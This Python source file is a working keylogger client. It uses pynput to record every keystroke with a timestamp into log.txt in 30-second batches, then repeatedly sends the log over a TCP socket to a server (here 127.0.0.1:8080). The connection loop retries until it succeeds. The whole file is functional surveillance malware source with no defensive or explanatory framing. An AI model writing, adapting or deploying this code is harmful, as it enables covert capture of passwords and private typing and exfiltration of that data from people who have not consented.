import socket
from pynput.keyboard import Listener, Key
import time

#Client Side Socket Connection.
s=socket.socket()
host='127.0.0.1'
port=8080
connecting=True
#Connecting to the TCP Server *with error handling
while connecting:
    try:
        print('Trying to connect...')
        s.connect((host,port))
        connecting=False
    except:
        continue
print('Succesfully Connected')
#Create the initial log file if it doesn't exist.
logfile=open('log.txt','a+')
logfile.close()

#Logging Function to start logging
def logging():
    global bt,logfile
    bt=time.time()
    logfile=open('log.txt','w+')
    #Logger and Listener of Keyboard Strokes.
    def on_press(key):
        #Logging Key + Data and Time of click.
        log_info = str(key) + ' Pressed' + ' at ' + time.asctime()
        print(log_info)
        logfile.write(log_info + '\n')
        # Number Displays Time to Log Keyboard Strokes in Seconds.
        if bt + 30 < time.time():
            print('Closing File...')
            logfile.close()
            return False
    with Listener(on_press=on_press) as listener:
        listener.join()
#Calling the logging function and sending the contents of log.txt in binary to the TCP server.
while True:
    logging()
    data=open('log.txt','rb')
    data_sent=data.read(16777216)
    s.send(data_sent)